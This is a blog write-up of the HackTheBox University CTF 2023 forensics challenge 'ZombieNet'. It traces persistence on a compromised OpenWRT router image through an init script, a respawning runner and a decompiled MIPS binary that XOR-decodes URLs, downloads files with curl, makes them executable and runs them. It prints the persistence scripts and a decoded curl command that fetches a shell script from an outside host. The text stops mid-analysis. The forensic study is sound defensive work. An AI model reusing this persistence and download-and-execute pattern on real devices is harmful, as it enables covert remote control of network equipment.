

<!DOCTYPE html>
<html lang="en-us">
<head><meta charset="UTF-8">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge"><meta name="robots" content="index, follow"><link rel="author" href="/humans.txt">
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<meta name="msapplication-TileImage" content="/mstile-144x144.png">
<meta name="theme-color" content="#494f5c">
<meta name="msapplication-TileColor" content="#494f5c">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#494f5c"><meta name="author" content="Jeremy Dunn">

  <meta itemprop="name" content="HackTheBox University CTF 2023 - ZombieNet">
  <meta itemprop="description" content="The second forensics challenge for HackTheBox University CTF 2023 was called ZombieNet. It gave participants an image of an OpenWRT router, and asked them to determine how the attackers were maintaining persistent access to the device. This post will walk through the steps I took to solve the challenge.
Challenge Description There was an attack on the NOC (Network Operations Center) of Hackster University and as a result, a large number of Network devices were compromised! After successfully fending off the attack the devices were decommissioned and sent off to be inspected. However, there is a strong suspicion among your peers that not all devices were identified! They suspect that the attackers managed to maintain access to the network despite our team’s efforts! It’s your job to investigate a recently used disk image and uncover how the Zombies maintain their access!">
  <meta itemprop="datePublished" content="2023-10-17T11:23:50-05:00">
  <meta itemprop="dateModified" content="2023-10-17T11:23:50-05:00">
  <meta itemprop="wordCount" content="2000">
  <meta itemprop="keywords" content="Writeups,Dfir"><meta property="og:url" content="https://stolenfootball.github.io/posts/writeups/2023/htb-uni-ctf/zombienet/">
  <meta property="og:site_name" content="Jeremy&#39;s Blog">
  <meta property="og:title" content="HackTheBox University CTF 2023 - ZombieNet">
  <meta property="og:description" content="The second forensics challenge for HackTheBox University CTF 2023 was called ZombieNet. It gave participants an image of an OpenWRT router, and asked them to determine how the attackers were maintaining persistent access to the device. This post will walk through the steps I took to solve the challenge.
Challenge Description There was an attack on the NOC (Network Operations Center) of Hackster University and as a result, a large number of Network devices were compromised! After successfully fending off the attack the devices were decommissioned and sent off to be inspected. However, there is a strong suspicion among your peers that not all devices were identified! They suspect that the attackers managed to maintain access to the network despite our team’s efforts! It’s your job to investigate a recently used disk image and uncover how the Zombies maintain their access!">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="website">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="HackTheBox University CTF 2023 - ZombieNet">
  <meta name="twitter:description" content="The second forensics challenge for HackTheBox University CTF 2023 was called ZombieNet. It gave participants an image of an OpenWRT router, and asked them to determine how the attackers were maintaining persistent access to the device. This post will walk through the steps I took to solve the challenge.
Challenge Description There was an attack on the NOC (Network Operations Center) of Hackster University and as a result, a large number of Network devices were compromised! After successfully fending off the attack the devices were decommissioned and sent off to be inspected. However, there is a strong suspicion among your peers that not all devices were identified! They suspect that the attackers managed to maintain access to the network despite our team’s efforts! It’s your job to investigate a recently used disk image and uncover how the Zombies maintain their access!">
<title>HackTheBox University CTF 2023 - ZombieNet</title>
<link rel="alternate" type="application/rss+xml" href="https://stolenfootball.github.io/posts/writeups/2023/htb-uni-ctf/zombienet/index.xml" title="HackTheBox University CTF 2023 - ZombieNet" />
<link rel="stylesheet dns-prefetch preconnect preload prefetch" as="style" href="https://stolenfootball.github.io/css/style.min.2e296f7531e030aa9a11d5bdd8654e3637eaffbb46b17a3de02e189529efc520.css" integrity="sha256-LilvdTHgMKqaEdW92GVONjfq/7tGsXo94C4YlSnvxSA=" crossorigin="anonymous"></head>
<body id="page">
	<header id="site-header">
		<div class="hdr-wrapper section-inner">
			<div class="hdr-left">
				<div class="site-branding">
					<a href="https://stolenfootball.github.io/">Jeremy&#39;s Blog</a>
				</div>
				<nav class="site-nav hide-in-mobile"><a href="https://stolenfootball.github.io/posts/">Posts</a><a href="https://stolenfootball.github.io/about/">About</a></nav>
			</div>
			<div class="hdr-right hdr-icons">
				<span class="hdr-links hide-in-mobile"><a href="mailto:jeremy.dunn315@gmail.com" target="_blank" rel="noopener me" title="Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
   <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
   <polyline points="22,6 12,13 2,6"></polyline>
</svg></a><a href="https://github.com/stolenfootball" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
   <path
      d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
   </path>
</svg></a><a href="https://www.linkedin.com/in/jeremy-dunn-a0b945172/" target="_blank" rel="noopener me" title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
   <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
   <rect x="2" y="9" width="4" height="12"></rect>
   <circle cx="4" cy="4" r="2"></circle>
</svg></a><a href="https://discordapp.com/users/stolenfootball#3265" target="_blank" rel="noopener me" title="Discord"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
   stroke-linecap="round" stroke-linejoin="round">
   <path
      d="M8.82889 11.203C7.86239 11.203 7.09937 12.0508 7.09937 13.0852C7.09937 14.1195 7.87935 14.9673 8.82889 14.9673C9.79538 14.9673 10.5584 14.1195 10.5584 13.0852C10.5754 12.0508 9.79538 11.203 8.82889 11.203ZM15.0178 11.203C14.0514 11.203 13.2883 12.0508 13.2883 13.0852C13.2883 14.1195 14.0683 14.9673 15.0178 14.9673C15.9843 14.9673 16.7474 14.1195 16.7474 13.0852C16.7474 12.0508 15.9843 11.203 15.0178 11.203Z"
      fill="currentColor" />
   <path
      d="M14.8477 18.3649C14.8874 18.4483 14.9381 18.5296 15.0005 18.6075C15.3663 19.0644 15.7387 19.5135 15.8832 19.687C16.1242 19.9764 16.4855 20.1329 16.8553 20.117C20.6839 19.9522 22.4053 17.6063 22.7126 17.1342C22.8526 16.919 22.9029 16.6887 22.9023 16.4867C22.8862 11.0873 20.6126 6.69288 20.3618 6.22299C20.2686 6.04849 20.1448 5.9213 20.0223 5.83024C17.6324 4.05442 15.3398 3.89258 14.7987 3.87945C14.4248 3.87037 14.1018 4.039 13.8908 4.28019C13.7833 4.40298 13.7069 4.53817 13.659 4.67843C12.4808 4.5498 11.3488 4.5684 10.3271 4.681C10.2848 4.54257 10.2137 4.40813 10.1111 4.28494C9.90289 4.03513 9.58304 3.87239 9.22517 3.87894C8.72884 3.88801 6.40341 4.02781 3.9777 5.83024C3.85516 5.9213 3.73139 6.04849 3.63825 6.22299C3.38742 6.69289 1.11365 11.0876 1.09774 16.4873C1.09715 16.6871 1.14634 16.9155 1.28416 17.1296C1.58866 17.6027 3.29601 19.9515 7.12649 20.1169C7.50079 20.1331 7.86486 19.9726 8.10512 19.6794C8.2521 19.5 8.63516 19.0311 9.00416 18.5683C9.06865 18.4874 9.12057 18.4028 9.16075 18.316C9.32759 18.3546 9.49869 18.391 9.67405 18.4248L9.67405 18.4248L9.68004 18.426C11.0465 18.681 12.6626 18.7747 14.4312 18.4443C14.5698 18.4206 14.7086 18.3942 14.8477 18.3649Z"
      stroke="currentColor" stroke-width="2" />
</svg></a></span><button id="share-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-share-2">
      <circle cx="18" cy="5" r="3"></circle>
      <circle cx="6" cy="12" r="3"></circle>
      <circle cx="18" cy="19" r="3"></circle>
      <line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line>
      <line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line>
   </svg></button>
 
<div id="share-links" class="animated fast">
    
    
    
    
    <ul>
        <li>
            <a href="https://twitter.com/intent/tweet?hashtags=hermit2&amp;url=https%3a%2f%2fstolenfootball.github.io%2fcategories%2f&amp;text=Categories" target="_blank" rel="noopener" aria-label="Share on X"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
   <path class="st0" d="m21.3 21.1 -11.4 -18.2h-7.2l11.4 18.2zm-18.6 0 7.2 -6.6m4.2 -5 7.2 -6.6" />
</svg></a>
        </li>
        <li>
            <a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fstolenfootball.github.io%2fcategories%2f" target="_blank" rel="noopener" aria-label="Share on Facebook"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
   <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
</svg></a>
        </li>
        <li>
            <a href="mailto:?subject=Categories&amp;body=https%3a%2f%2fstolenfootball.github.io%2fcategories%2f" target="_self" rel="noopener" aria-label="Share on Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
   <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
   <polyline points="22,6 12,13 2,6"></polyline>
</svg></a>
        </li>
        <li>
            <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fstolenfootball.github.io%2fcategories%2f&amp;source=https%3a%2f%2fstolenfootball.github.io%2f&amp;title=Categories&amp;summary=Categories%2c%20by%20Jeremy%20Dunn%0a%0a%3cnil%3e%0a" target="_blank" rel="noopener" aria-label="Share on LinkedIn"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
   <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
   <rect x="2" y="9" width="4" height="12"></rect>
   <circle cx="4" cy="4" r="2"></circle>
</svg></a>
        </li>
        <li>
            <a href="#" onclick="linkShare(&#34;Categories&#34;,&#34;https://stolenfootball.github.io/categories/&#34;,&#34;Categories, by Jeremy Dunn\n\n\u003cnil\u003e\n&#34;); return false;" target="_self" rel="noopener" aria-label="Copy Link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-copy">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
   </svg></a>
        </li>
    </ul>
</div><button id="menu-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu">
      <line x1="3" y1="12" x2="21" y2="12"></line>
      <line x1="3" y1="6" x2="21" y2="6"></line>
      <line x1="3" y1="18" x2="21" y2="18"></line>
   </svg></button>
			</div>
		</div>
	</header>
	<div id="mobile-menu" class="animated fast">
		<ul>
			<li><a href="https://stolenfootball.github.io/posts/">Posts</a></li>
			<li><a href="https://stolenfootball.github.io/about/">About</a></li>
		</ul>
	</div>


	<main class="site-main section-inner thin animated fadeIn faster">
		<h1>HackTheBox University CTF 2023 - ZombieNet</h1>
		<div class="content">
			<p>The second forensics challenge for HackTheBox University CTF 2023 was called ZombieNet.  It gave participants an image of an OpenWRT router, and asked them to determine how the attackers were maintaining persistent access to the device.  This post will walk through the steps I took to solve the challenge.</p>
<h2 id="challenge-description">Challenge Description</h2>
<p>There was an attack on the NOC (Network Operations Center) of Hackster University and as a result, a large number of Network devices were compromised! After successfully fending off the attack the devices were decommissioned and sent off to be inspected. However, there is a strong suspicion among your peers that not all devices were identified! They suspect that the attackers managed to maintain access to the network despite our team&rsquo;s efforts! It&rsquo;s your job to investigate a recently used disk image and uncover how the Zombies maintain their access!</p>
<h2 id="the-image">The Image</h2>
<p>The image provided was a small disk image file called <code>openwrt-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin</code>. I first attempted to analyze the image using Autopsy and TheSleuthKit, but they were unable to handle the binary firmware image.  I then used <code>binwalk</code> to extract the contents of the image, and found a full Linux filesystem.</p>
<p><img src="./images/1-router_filesystem.png" alt="Router Filesystem"></p>
<p>I began by trying to manually review the filesystem for anomalies, but with the large number of files and directories within the image, I quickly decided to take a different approach.</p>
<p>The main draw of <code>binwalk</code> is that it has the ability to perform signature scanning on a file - that is, it can search for magic numbers and other signatures that indicate the presence of a particular file type.  That is how it was able to retrieve all of the above files from the image.</p>
<p>But the <code>binwalk</code> signature scanning capabilities are not limited to just files it finds within the image - it can also analyze the image itself to determine the signature of the firmware.</p>
<p>Running <code>binwalk</code> without the <code>-e</code> flag will perform a signature scan on the image, and return the results.</p>
<p><img src="./images/2-binwalk_signature.png" alt="Binwalk Signature Scan"></p>
<p>As I highlighted in the image, this is a <!-- raw HTML omitted -->MIPS OpenWrt Linux-5.15.137<!-- raw HTML omitted --> image.  And from the name of the file, we know the exact version of OpenWRT that was used to create the image.  This is important, because it means we can download the source code for that version of OpenWRT, and compare the two to determine which changes were made in the image supplied to us.  If we can figure out what is different, the list of potentially malicious files to review will be much smaller.</p>
<p>After a quick Google search, I found the following site: <a href="https://openwrt.org/inbox/toh/xiaomi/xiaomi_mi_router_4a_gigabit_edition">https://openwrt.org/inbox/toh/xiaomi/xiaomi_mi_router_4a_gigabit_edition</a>, which contains a link to a firmware image for this exact same router.  The link is:</p>
<p><a href="https://downloads.openwrt.org/releases/23.05.0/targets/ramips/mt7621/openwrt-23.05.0-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin">https://downloads.openwrt.org/releases/23.05.0/targets/ramips/mt7621/openwrt-23.05.0-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin</a></p>
<p>This is close, but not the exact same image.  This is version 23.05.0, whereas the image we were given, as indicated by <code>binwalk</code>, is 23.05.137.  Although the link to version 23.05.137 doesn&rsquo;t appear to be listed, I was able to find it by modifying the URL slightly:</p>
<p><a href="https://downloads.openwrt.org/releases/23.05.137/targets/ramips/mt7621/openwrt-23.05.137-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin">https://downloads.openwrt.org/releases/23.05.137/targets/ramips/mt7621/openwrt-23.05.137-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin</a></p>
<p>Next, I extracted the contents of the two images, and used the <code>diff</code> command with the <code>-r</code> flag to recursively compare the directories, and the <code>-q</code> to only output the files that were different.  Then, I used <code>grep</code> to filter by files that only appeared in the modified image we were given.  The command I used was:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>diff -qr _openwrt-image-original/ factory_images/_openwrt-image-factory/ | grep <span style="color:#e6db74">&#34;Only in _openwrt&#34;</span>
</span></span></code></pre></div><p><img src="./images/3-diff_results.png" alt="Output of command"></p>
<p>There are a number of suspicious files in this list, but one stands out: <!-- raw HTML omitted -->/etc/rc.d/S95dead-reanimation<!-- raw HTML omitted -->.  This is a startup script that will be executed when the router boots up; it is clearly not standard, and is also themed like the rest of the CTF.</p>
<h2 id="dead-reanimation">dead-reanimation</h2>
<p>The <code>S95dead-reanimation</code> script is actually an OpenRC startup script, which is a symbolic link that runs another script whenever the router starts.  This is a well known feature of how OpenRC works, but we can confirm it by looking at the contents of the <code>/etc/rc.d</code> directory:</p>
<p><img src="./images/4-openrc_startup_script.png" alt="OpenRC Startup Script"></p>
<p>Let&rsquo;s look at the script this link points to, <code>/etc/init.d/dead-reanimation</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh /etc/rc.common
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>START<span style="color:#f92672">=</span><span style="color:#ae81ff">95</span>
</span></span><span style="display:flex;"><span>USE_PROCD<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>PROG<span style="color:#f92672">=</span>/sbin/zombie_runner
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>start_service<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>	procd_open_instance
</span></span><span style="display:flex;"><span>	procd_set_param command $PROG
</span></span><span style="display:flex;"><span>	procd_set_param respawn <span style="color:#e6db74">${</span>respawn_threshold<span style="color:#66d9ef">:-</span>3600<span style="color:#e6db74">}</span> <span style="color:#e6db74">${</span>respawn_timeout<span style="color:#66d9ef">:-</span>5<span style="color:#e6db74">}</span> <span style="color:#e6db74">${</span>respawn_retry<span style="color:#66d9ef">:-</span>5<span style="color:#e6db74">}</span>
</span></span><span style="display:flex;"><span>	procd_close_instance
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span> 
</span></span></code></pre></div><p>This is simple service script, which runs <code>/sbin/zombie_runner</code> on boot. Let&rsquo;s look at <code>/sbin/zombie_runner</code> next:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#f92672">[</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">do</span> 
</span></span><span style="display:flex;"><span>    /usr/bin/dead-reanimation
</span></span><span style="display:flex;"><span>    sleep <span style="color:#ae81ff">600</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>exit <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>This script is also simple - it runs <code>/usr/bin/dead-reanimation</code> every 10 minutes.  When we go to investigate this script, we find that it is a binary file, which can be seen with the <code>file</code> command:</p>
<p><img src="./images/5-dead_reanimation_binary.png" alt="Dead Reanimation Binary"></p>
<p>We know that the binary is a MIPS32 binary from the output of the <code>file</code> command.  The next step is to load it into Ghidra, and analyze it.  Once auto-analysis is complete, we can follow the calls from the entry point to determine what the binary does.</p>
<p>The first interesting function is <code>FUN_00400cf</code>, which looks as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">FUN_00400cf4</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  undefined4 local_a8;
</span></span><span style="display:flex;"><span>  undefined4 local_a4;
</span></span><span style="display:flex;"><span>  undefined4 local_a0;
</span></span><span style="display:flex;"><span>  undefined4 local_9c;
</span></span><span style="display:flex;"><span>  undefined4 local_98;
</span></span><span style="display:flex;"><span>  undefined local_94;
</span></span><span style="display:flex;"><span>  undefined4 local_90;
</span></span><span style="display:flex;"><span>  undefined4 local_8c;
</span></span><span style="display:flex;"><span>  undefined4 local_88;
</span></span><span style="display:flex;"><span>  undefined4 local_84;
</span></span><span style="display:flex;"><span>  undefined2 local_80;
</span></span><span style="display:flex;"><span>  undefined auStack_7c [<span style="color:#ae81ff">60</span>];
</span></span><span style="display:flex;"><span>  undefined auStack_40 [<span style="color:#ae81ff">56</span>];
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_a8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9a6f65f0</span>;
</span></span><span style="display:flex;"><span>  local_a4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xadf4e47e</span>;
</span></span><span style="display:flex;"><span>  local_a0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4e937069</span>;
</span></span><span style="display:flex;"><span>  local_9c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8ec5e155</span>;
</span></span><span style="display:flex;"><span>  local_98 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3af55fc1</span>;
</span></span><span style="display:flex;"><span>  local_94 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  local_90 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9a6f65f0</span>;
</span></span><span style="display:flex;"><span>  local_8c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xadf4f27e</span>;
</span></span><span style="display:flex;"><span>  local_88 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4a8c4663</span>;
</span></span><span style="display:flex;"><span>  local_84 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9082ea40</span>;
</span></span><span style="display:flex;"><span>  local_80 <span style="color:#f92672">=</span> <span style="color:#ae81ff">200</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(auStack_7c,<span style="color:#f92672">&amp;</span>DAT_00400f74,<span style="color:#ae81ff">0x3a</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(auStack_40,<span style="color:#f92672">&amp;</span>DAT_00400fb0,<span style="color:#ae81ff">0x37</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00400c04</span>(<span style="color:#f92672">&amp;</span>local_a8);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00400c04</span>(<span style="color:#f92672">&amp;</span>local_90);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00400c04</span>(auStack_7c);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00400c04</span>(auStack_40);
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">access</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_a8,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_00400b20</span>(auStack_7c,<span style="color:#f92672">&amp;</span>local_a8);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">chmod</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_a8,<span style="color:#ae81ff">0x1ff</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">access</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_90,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_00400b20</span>(auStack_40,<span style="color:#f92672">&amp;</span>local_90);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">chmod</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_90,<span style="color:#ae81ff">0x1ff</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_90);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_a8);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>After renaming a few variables and removing some of the Ghidra decompilation artifacts, the function looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">downloadAndExecute</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(file_1,<span style="color:#f92672">&amp;</span>DAT_00400f74,<span style="color:#ae81ff">0x3a</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(file_2,<span style="color:#f92672">&amp;</span>DAT_00400fb0,<span style="color:#ae81ff">0x37</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>(<span style="color:#f92672">&amp;</span>url_1);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>(<span style="color:#f92672">&amp;</span>url_2);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>(file_1);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>(file_2);
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">access</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>url_1,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">curl</span>(file_1,<span style="color:#f92672">&amp;</span>url_1);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">chmod</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>url_1,<span style="color:#ae81ff">0x1ff</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">access</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>url_2,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">curl</span>(file_2,<span style="color:#f92672">&amp;</span>url_2);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">chmod</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>url_2,<span style="color:#ae81ff">0x1ff</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>url_2);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>url_1);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Next, I grabbed the contents of the two URLs and files from the memory of the binary, along with the key used to XOR them. I plugged all of them into CyberChef, and got the following results:</p>
<p><img src="./images/6-cyberchef_decode.png" alt="CyberChef Decode"></p>
<p>The first command (translated) is <code>curl http://configs.router.htb/reanimate.sh_jEzOWMtZTUxOS00 &gt; /tmp/reanimate.sh</code></p>
